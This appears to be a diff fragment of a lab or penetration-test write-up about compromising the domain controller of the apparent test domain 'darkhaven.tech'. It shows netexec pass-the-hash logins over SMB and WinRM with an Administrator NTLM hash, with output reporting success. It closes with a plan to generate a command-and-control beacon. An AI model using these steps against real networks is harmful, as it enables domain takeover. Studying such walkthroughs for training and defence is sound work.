@@ -703,4 +703,15 @@ nxc smb dc.darkhaven.tech -u Administrator -H 'b38a41e844c5c3d706c1e9e575f3e62c'
 SMB         10.10.10.4      445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:darkhaven.tech) (signing:True) (SMBv1:None) (Null Auth:True)
 SMB         10.10.10.4      445    DC               [+] darkhaven.tech\Administrator:b38a41e844c5c3d706c1e9e575f3e62c (Pwn3d!)
 ```
-The administrator has now been compromised 
+The administrator has now been compromised on the root domain controller
+
+```python
+nxc winrm dc.darkhaven.tech -u Administrator -H 'b38a41e844c5c3d706c1e9e575f3e62c'
+WINRM       10.10.10.4      5985   DC               [*] Windows 11 / Server 2025 Build 26100 (name:DC) (domain:darkhaven.tech) 
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+WINRM       10.10.10.4      5985   DC               [+] darkhaven.tech\Administrator:b38a41e844c5c3d706c1e9e575f3e62c (Pwn3d!)
+```
+Ill now generate the beacon for my root DC listener
+
+
